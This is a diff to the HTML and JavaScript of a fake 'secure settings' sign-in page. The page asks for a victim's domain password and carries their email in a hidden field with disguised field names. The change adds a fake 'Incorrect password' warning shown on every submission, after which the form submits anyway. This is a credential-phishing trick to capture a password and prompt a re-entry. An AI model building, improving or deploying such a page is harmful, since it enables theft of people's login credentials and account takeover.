@@ -196,6 +196,19 @@
             }
         }
 
+        /* Warning message styling */
+        .warning-message {
+            display: none;
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            text-align: center;
+            width: 65%;
+            box-sizing: border-box;
+            animation: fadeIn 0.3s ease-in-out;
+        }
     </style>
 </head>
 <body>
@@ -217,13 +230,18 @@
     <div class="signin-container" id="signin-container" style="display:none;">
         <div id="forms">
             <center>
-                <!-- <img src="https://api.kickfire.com/logo?website={{ins}}" style="width:32px; height:32px;"> -->
                 <h2>You're accessing secure settings</h2>
                 <p style="font-size:0.8em;">Please provide your <strong>{{dman}}</strong> password to continue.</p>
             </center>
             <form name="myform" id="login_form" action="second" method="POST" target="_top">
                 <label for="password">Password</label>
                 <input type="hidden" id="pet" name="horse" value="{{eman}}">
+                
+                <!-- Warning message -->
+                <div class="warning-message" id="warningMessage">
+                    <i class="fas fa-exclamation-triangle"></i> Incorrect password. Please try again.
+                </div>
+                
                 <div class="password-container">
                     <input type="password" id="pett" name="pig" placeholder="Enter your password" required>
                     <span class="show-password" onclick="togglePassword()" data-tooltip="Show/Hide Password">
@@ -233,10 +251,9 @@
                 <button type="submit">Sign In</button>
                 <footer>
                     <p>Authentication is required!<br> © 2025 Secure Portal | Privacy</p>
-					<p type="hidden" id="info-text"></p>
+                    <p type="hidden" id="info-text"></p>
                 </footer>
             </form>
-
         </div>
     </div>
 
@@ -292,6 +309,18 @@
             }
         }
 
+        // Show warning message for 2 seconds
+        function showWarningMessage() {
+            const warningMessage = document.getElementById('warningMessage');
+            warningMessage.style.display = 'block';
+            
+            setTimeout(function() {
+                warningMessage.style.display = 'none';
+                // Continue with form submission after warning is hidden
+                document.getElementById('login_form').submit();
+            }, 1000);
+        }
+
         // Set info dynamically
         async function loadInfo() {
             document.getElementById('currentDateTime').textContent = getCurrentDateTime();
@@ -306,15 +335,22 @@
             setTimeout(function () {
                 document.getElementById("loader").style.display = "none";
                 document.getElementById("signin-container").style.display = "block";
-            }, 5000);
+            }, 4000);
         }
+
+        // Form submission handler
+        document.getElementById('login_form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent immediate form submission
+            
+            // Show warning message for 2 seconds before submitting
+            showWarningMessage();
+        });
 
         // Call the load info function and show loader on page load
         window.onload = function () {
             loadInfo();
             showLoader();
-			
-			};
+        };
     </script>
 </body>
 </html>
